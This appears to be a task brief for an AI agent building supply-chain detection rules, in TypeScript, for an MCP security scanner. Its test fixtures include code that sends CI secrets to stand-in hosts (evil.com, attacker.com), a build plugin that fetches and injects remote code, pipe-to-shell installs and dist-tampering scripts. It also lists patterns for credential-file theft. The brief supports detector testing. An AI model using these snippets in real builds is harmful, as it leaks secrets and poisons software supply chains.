# Sprint 4: Supply Chain & Config — Migrate Rules from YAML Regex to TypeScript

## Mission

You are the **P8 Detection Rule Engineer**. Migrate the **Supply Chain & Config** risk domain rules from YAML regex to TypeScript. These rules detect supply chain attacks, CI/CD poisoning, config injection, and package integrity issues in MCP server ecosystems.

**Shared context (AnalysisContext, TypedRule interface, existing toolkits, registration pattern):** See `docs/migration-prompts/sprint-1-human-oversight.md`.

## Architecture Note

These rules analyze package manifests (package.json, setup.py, pyproject.toml), CI/CD configs (.github/workflows/*.yml), Dockerfiles, MCP config files (.mcp.json, claude_desktop_config.json), and application source code. When `source_files` map is available, route each file to the appropriate parser by file path. When only `source_code` string is available, detect embedded sections by content markers (`"scripts":`, `uses:`, `FROM`, `"mcpServers":`).

## Rules to Migrate — Group A: CI/CD & Build (4 rules, full test cases)

### Rule L1 — GitHub Actions Tag Poisoning (PURE REGEX → TypeScript)

**YAML:** `rules/L1-github-actions-tag-poisoning.yaml` | **Severity:** critical
**Intelligence:** CVE-2025-30066 (tj-actions/changed-files, CVSS 8.6), CVE-2026-31976 (xygeni-action, CVSS 9.3)

**Analysis technique:** Parse GitHub Actions workflow YAML for unsafe action references:
- Mutable tag references: `uses: org/action@v1` (without SHA pinning)
- Known-compromised actions: `tj-actions/changed-files`, `reviewdog/action-setup`
- Branch references: `@main`, `@master`, `@dev`, `@latest`
- Pipe-to-shell: `curl ... | bash`, `wget ... | sh`

**Confidence:** Known-compromised action → 0.95 | Branch ref → 0.90 | Mutable tag → 0.80 | Pipe-to-shell in `run:` → 0.85

```typescript
// TP1: Mutable tag reference (not SHA-pinned)
const tp1 = `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: some-org/custom-action@v2`;

// TP2: Known-compromised action
const tp2 = `
jobs:
  check:
    steps:
      - uses: tj-actions/changed-files@v44
      - run: echo "Changed files detected"`;

// TP3: Branch reference
const tp3 = `
jobs:
  deploy:
    steps:
      - uses: custom-org/deploy-action@main`;

// TP4: Pipe-to-shell in run step
const tp4 = `
jobs:
  install:
    steps:
      - run: curl -fsSL https://install.example.com/setup.sh | bash`;

// TN1: SHA-pinned action (should NOT flag)
const tn1 = `
jobs:
  build:
    steps:
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`;

// TN2: Official GitHub actions with version tags (should NOT flag)
const tn2 = `
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - uses: actions/cache@v3`;

// TN3: Test/example file (should NOT flag)
const tn3 = `
// test/fixtures/workflow-example.yml
// uses: vulnerable-org/action@v1`;

// TN4: Local action reference (should NOT flag)
const tn4 = `
jobs:
  build:
    steps:
      - uses: ./.github/actions/local-action`;
```

---

### Rule L9 — CI/CD Secret Exfiltration (PURE REGEX → TypeScript)

**YAML:** `rules/L9-ci-secret-exfiltration.yaml` | **Severity:** critical
**Intelligence:** CVE-2025-30066 (tj-actions secret exfil), Shai-Hulud worm (Sept 2025)

**Analysis technique:** Detect patterns that leak secrets from CI environments:
- Logging secrets: `console.log(process.env.TOKEN)`, `echo $SECRET`
- Encoding for exfil: `btoa(process.env.KEY)`, `base64.b64encode(os.environ)`
- HTTP exfil: `fetch(url, { body: process.env })`, `requests.post(url, data=os.environ)`
- DNS exfil: `dns.resolve(secret + '.attacker.com')`
- Full env dump: `JSON.stringify(process.env)`, `Object.keys(process.env)`

**Confidence:** HTTP exfil of env vars → 0.95 | Full env dump → 0.90 | Logging secrets → 0.80 | DNS exfil → 0.92

```typescript
// TP1: Logging secrets to stdout
const tp1 = `
console.log('Token: ' + process.env.NPM_TOKEN);
console.log('Key: ' + process.env.ANTHROPIC_API_KEY);`;

// TP2: Base64-encoding secrets for exfiltration
const tp2 = `
const encoded = Buffer.from(process.env.GITHUB_TOKEN).toString('base64');
fetch('https://attacker.com/collect', { method: 'POST', body: encoded });`;

// TP3: Full environment dump
const tp3 = `
const allSecrets = JSON.stringify(process.env);
await axios.post(webhookUrl, { data: allSecrets });`;

// TP4: Python CI secret exfiltration
const tp4 = `
import os, requests
secrets = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'SECRET' in k}
requests.post('https://evil.com/collect', json=secrets)`;

// TN1: Masking secrets in CI (should NOT flag)
const tn1 = `
const token = process.env.GITHUB_TOKEN;
console.log('::add-mask::' + token);`;

// TN2: Test file (should NOT flag)
const tn2 = `
// test/ci-integration.test.ts
process.env.NPM_TOKEN = 'test-token-not-real';
console.log(process.env.NPM_TOKEN);`;

// TN3: Sanitized logging (should NOT flag)
const tn3 = `
function logConfig() {
  const sanitized = maskSensitiveFields(process.env);
  logger.info({ config: sanitized }, 'Environment loaded');
}`;

// TN4: Reading env for config, not exfiltrating (should NOT flag)
const tn4 = `
const port = process.env.PORT || 3000;
const logLevel = process.env.LOG_LEVEL || 'info';
console.log('Server starting on port ' + port);`;
```

---

### Rule L2 — Malicious Build Plugin (PURE REGEX → TypeScript)

**YAML:** `rules/L2-malicious-build-plugin.yaml` | **Severity:** critical
**Intelligence:** CVE-2026-27606 (Rollup path traversal), Shai-Hulud worm (Nov 2025)

**Analysis technique:** Detect build plugins (Rollup, Vite, Webpack, esbuild) with dangerous behavior:
- File write outside build dir: `plugin` + `writeFile` + `../..`
- Network access in build: `plugin` + `fetch`/`http.request`/`child_process`
- Remote plugin import: `plugins: [require('https://...')]`
- Env exfiltration in transform: `transform` + `process.env` + `fetch`

**Confidence:** Plugin with network + exec → 0.92 | Plugin with path traversal write → 0.90 | Remote plugin import → 0.95

```typescript
// TP1: Rollup plugin writing files outside build dir
const tp1 = `
export default {
  plugins: [{
    name: 'inject',
    generateBundle() {
      require('fs').writeFileSync('../../.env', 'PAYLOAD=true');
    }
  }]
};`;

// TP2: Webpack plugin with child_process
const tp2 = `
class ExfilPlugin {
  apply(compiler) {
    compiler.hooks.done.tap('ExfilPlugin', () => {
      const { execSync } = require('child_process');
      execSync('curl https://evil.com/collect?data=' + process.env.TOKEN);
    });
  }
}`;

// TP3: Vite plugin fetching remote code
const tp3 = `
import { defineConfig } from 'vite';
export default defineConfig({
  plugins: [{
    name: 'remote-loader',
    async transform(code) {
      const payload = await fetch('https://evil.com/inject.js').then(r => r.text());
      return code + payload;
    }
  }]
});`;

// TP4: esbuild plugin exfiltrating env
const tp4 = `
const plugin = {
  name: 'env-leak',
  setup(build) {
    build.onEnd(() => {
      fetch('https://attacker.com/env', {
        method: 'POST',
        body: JSON.stringify(process.env)
      });
    });
  }
};`;

// TN1: Standard rollup plugins (should NOT flag)
const tn1 = `
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
export default { plugins: [resolve(), commonjs()] };`;

// TN2: esbuild plugin doing normal build work (should NOT flag)
const tn2 = `
const cleanPlugin = {
  name: 'clean',
  setup(build) {
    build.onStart(() => {
      require('fs').rmSync('dist', { recursive: true, force: true });
    });
  }
};`;

// TN3: Test file (should NOT flag)
const tn3 = `
// test/build-plugins.test.ts
const mockPlugin = { name: 'test', setup() {} };`;

// TN4: Plugin writing to build output dir (should NOT flag)
const tn4 = `
const copyPlugin = {
  name: 'copy-assets',
  generateBundle() {
    this.emitFile({ type: 'asset', fileName: 'manifest.json', source: '{}' });
  }
};`;
```

---

### Rule L12 — Build Artifact Tampering (PURE REGEX → TypeScript)

**YAML:** `rules/L12-build-artifact-tampering.yaml` | **Severity:** critical
**Intelligence:** SLSA framework, CVE-2026-27606 (Rollup path traversal)

**Analysis technique:** Detect post-build modification of distribution artifacts:
- Post-build script modifying dist/: `postbuild` + `sed`/`awk`/`cat >>` targeting `dist/`
- Append to built files: `appendFileSync('dist/index.js', ...)`
- Test-then-tamper: `npm test && sed ... dist/ && npm publish`
- CI artifact modification after download

**Confidence:** Post-build script modifying dist → 0.90 | appendFile to dist → 0.88 | Test-then-tamper chain → 0.92

```typescript
// TP1: postbuild script injecting into dist
const tp1 = `
{
  "scripts": {
    "build": "tsc",
    "postbuild": "echo 'require(\"./payload\")' >> dist/index.js"
  }
}`;

// TP2: Appending to built artifact programmatically
const tp2 = `
const fs = require('fs');
fs.appendFileSync('dist/index.js', '\\nfetch("https://evil.com/ping");');`;

// TP3: Test-then-tamper-then-publish chain
const tp3 = `
{
  "scripts": {
    "release": "npm test && sed -i 's/safe/unsafe/g' dist/index.js && npm publish"
  }
}`;

// TP4: CI artifact modification
const tp4 = `
- uses: actions/download-artifact@v3
  with:
    name: build-output
- run: |
    node inject-analytics.js dist/
    sed -i 's|//# sourceMappingURL|//|g' dist/*.js`;

// TN1: Normal build script (should NOT flag)
const tn1 = `
{
  "scripts": {
    "build": "tsc && esbuild src/index.ts --outdir=dist",
    "prepublishOnly": "npm run build"
  }
}`;

// TN2: Minification in build (should NOT flag)
const tn2 = `
{
  "scripts": {
    "postbuild": "terser dist/index.js -o dist/index.min.js"
  }
}`;

// TN3: Test file (should NOT flag)
const tn3 = `
// test/build.test.ts
fs.appendFileSync(testOutputPath, 'test data');`;

// TN4: Source map generation (should NOT flag)
const tn4 = `
{
  "scripts": {
    "postbuild": "tsc --declarationMap --sourceMap"
  }
}`;
```

---

## Rules to Migrate — Group B: MCP Config & Package Integrity (8 rules, abbreviated)

For these rules, follow the same TypedRule pattern as Group A. Key detection per rule:

**L4 (MCP Config Code Injection):** Detect shell commands in `"command"` field (`bash -c`, `sh -e`), env var exfil in args (`process.env.API_KEY`), external URLs in server config, and code generation that writes to `.mcp.json`/`claude_desktop_config`. CVE-2025-59536/CVE-2026-21852. Exclude localhost URLs, test files.

**L5 (Manifest Confusion):** Detect `prepublish` scripts modifying `package.json` fields, `fs.writeFileSync` targeting `package.json` scripts/dependencies, runtime deletion of install hooks, and entry point swaps at publish time. Darcy Clarke npm manifest confusion (2023, STILL UNPATCHED). Exclude standard build (`tsc`, `esbuild`).

**L6 (Config Symlink Attack):** Detect `symlink`/`symlinkSync` targeting sensitive paths (`/etc/`, `~/.ssh`, `.claude/`), file reads on MCP config without `lstat`/`realpath` check, `stat` → `readFile` TOCTOU without `O_NOFOLLOW`, symlinks to `LaunchAgents`/`LaunchDaemons`. CVE-2025-53109/53110. Exclude code that checks `isSymbolicLink`.

**L7 (Transitive MCP Delegation):** Detect MCP client instantiation inside an MCP server (server importing `@modelcontextprotocol/sdk/client`), `tools/call` forwarding to upstream, proxy/delegate/bridge patterns with MCP tools, credential forwarding to upstream servers. Exclude server-only SDK imports.

**L8 (Version Rollback Attack):** Detect `overrides`/`resolutions` pinning to old versions (`"pkg": "0.x"`), lockfile modification via `sed`/`jq`, `npm install --force --no-package-lock` chains, direct lockfile read-modify-write. Exclude Renovate/Dependabot updates.

**L11 (Env Var Injection via Config):** Detect `LD_PRELOAD`/`DYLD_INSERT_LIBRARIES` in MCP config `env` blocks, `NODE_OPTIONS` with `--require`/`--import`, `PYTHONPATH`/`PYTHONSTARTUP` overrides, API base URL redirects (`ANTHROPIC_API_URL` → non-Anthropic), `PATH` hijacking, shell metacharacters in env values. CVE-2026-21852. Exclude `PORT`, `LOG_LEVEL`, `NODE_ENV`.

**L13 (Build Credential Theft):** Detect reading `.npmrc`, `.pypirc`, `.docker/config.json`, `~/.ssh/`, `~/.aws/` credential files, extracting `_authToken` from credential files, reading credential files then sending via HTTP. Shai-Hulud worm. Exclude writing `.npmrc` (setup).

**L14 (Hidden Entrypoint Mismatch):** Detect `bin` field shadowing system commands (`ls`, `cat`, `curl`, `node`), `exports` hiding `package.json` access, `main` vs `module` pointing to different files with one containing dangerous code, hidden dotfile entrypoints (`.hidden/`, `__`). Exclude own package bin entries.

Each rule: create TypedRule implementation + 8 test cases (4 TP + 4 TN).

---

## Rules to Migrate — Group C: Compliance & Cross-Ecosystem (7 rules, abbreviated)

**K9 (Dangerous Post-Install Hooks):** Detect `postinstall`/`preinstall` scripts executing `curl`/`wget`/`exec`/`eval`/`base64`, Python `setup.py` `cmdclass` with `subprocess`/`os.system`. Exclude `node-gyp`, `tsc`, `esbuild` (legitimate build hooks).

**K10 (Package Registry Substitution):** Detect custom `registry=` URLs (not npmjs.org), `--extra-index-url` pointing to non-PyPI, `npmRegistryServer` to unknown hosts, `GOPROXY` overrides. Exclude `localhost`, `verdaccio`, `artifactory`, `nexus` (legitimate private registries).

**K11 (Missing Server Integrity Verification):** Detect MCP server connection/loading without hash/checksum/signature verification, server URL assignment without TLS pinning, download of plugins without integrity check. Exclude when `verify`/`checksum`/`sha256` is present.

**L3 (Dockerfile Base Image Risk):** Detect `FROM image:latest` (mutable tags), untagged `FROM image`, untrusted registries (not node/python/alpine/official), `ARG` with credential names, `COPY .env`, pipe-to-shell in `RUN`. Exclude SHA-pinned images (`@sha256:`).

**L10 (Registry Metadata Spoofing):** Detect false author claims (`"author": "Anthropic"`), false verification badges, star/download manipulation loops, API calls to modify registry metadata, names squatting official namespaces. Exclude actual official org GitHub URLs.

**Q4 (IDE Config Injection):** Detect writing to `.cursor/`, `.vscode/`, `.mcp.json`, `.claude/` directories, `enableAllProjectMcpServers`/`auto-approve` patterns, case-sensitivity bypasses (`MCP.JSON`, `.CURSOR/`), `spawn`/`exec` with `shell: true` for MCP servers. CVE-2025-54135/54136 "IDEsaster". Exclude uninstall/remove operations.

**Q13 (MCP Bridge Package Supply Chain):** Detect unpinned `npx mcp-remote` (without `@version`), unpinned `uvx mcp-server`, caret/tilde/star version ranges for MCP packages, `spawn`/`exec` invoking `mcp-remote`/`mcp-proxy`, unpinned Python MCP packages. CVE-2025-6514 (CVSS 9.6). Exclude lockfile-protected installs.

Each rule: create TypedRule implementation + 8 test cases (4 TP + 4 TN).

---

## Files to Create/Modify

| File | Action |
|------|--------|
| `packages/analyzer/src/rules/implementations/l1-github-actions-tag.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l2-malicious-build-plugin.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l3-dockerfile-base-image.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l4-mcp-config-injection.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l5-manifest-confusion.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l6-config-symlink.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l7-transitive-delegation.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l8-version-rollback.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l9-ci-secret-exfil.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l10-registry-spoofing.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l11-env-var-injection.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l12-build-artifact-tamper.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l13-credential-theft.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/l14-hidden-entrypoint.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/k9-postinstall-hooks.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/k10-registry-substitution.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/k11-integrity-verification.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/q4-ide-config-injection.ts` | **Create** |
| `packages/analyzer/src/rules/implementations/q13-mcp-bridge-supply-chain.ts` | **Create** |
| `packages/analyzer/src/rules/index.ts` | **Modify** — add 19 imports |
| `packages/analyzer/__tests__/rules/l-supply-chain.test.ts` | **Create** — 112 test cases (14 L-rules × 8) |
| `packages/analyzer/__tests__/rules/k-supply-chain.test.ts` | **Create** — 24 test cases (3 K-rules × 8) |
| `packages/analyzer/__tests__/rules/q-supply-chain.test.ts` | **Create** — 16 test cases (2 Q-rules × 8) |
| `rules/K9-dangerous-postinstall-hooks.yaml` | **Modify** — `type: regex` → `type: typed`, remove patterns |
| `rules/K10-package-registry-substitution.yaml` | **Modify** — same |
| `rules/K11-missing-server-integrity-verification.yaml` | **Modify** — same |
| `rules/L1-github-actions-tag-poisoning.yaml` | **Modify** — same |
| `rules/L2-malicious-build-plugin.yaml` | **Modify** — same |
| `rules/L3-dockerfile-base-image-risk.yaml` | **Modify** — same |
| `rules/L4-mcp-config-code-injection.yaml` | **Modify** — same |
| `rules/L5-manifest-confusion.yaml` | **Modify** — same |
| `rules/L6-config-symlink-attack.yaml` | **Modify** — same |
| `rules/L7-transitive-mcp-delegation.yaml` | **Modify** — same |
| `rules/L8-version-rollback-attack.yaml` | **Modify** — same |
| `rules/L9-ci-secret-exfiltration.yaml` | **Modify** — same |
| `rules/L10-registry-metadata-spoofing.yaml` | **Modify** — same |
| `rules/L11-env-var-injection-via-config.yaml` | **Modify** — same |
| `rules/L12-build-artifact-tampering.yaml` | **Modify** — same |
| `rules/L13-npmrc-credential-theft.yaml` | **Modify** — same |
| `rules/L14-hidden-entrypoint-mismatch.yaml` | **Modify** — same |
| `rules/Q4-ide-config-injection.yaml` | **Modify** — same |
| `rules/Q13-mcp-remote-supply-chain.yaml` | **Modify** — same |

## Verification

1. `pnpm typecheck` — all packages pass
2. `pnpm test --filter=@mcp-sentinel/analyzer` — all tests pass including 152 new supply chain tests
3. `bash tools/scripts/validate-rules.sh` — all 177 rules validate
4. All 19 YAML files no longer contain `patterns` or `context` fields
5. All 19 TypedRules produce findings with confidence scores and evidence
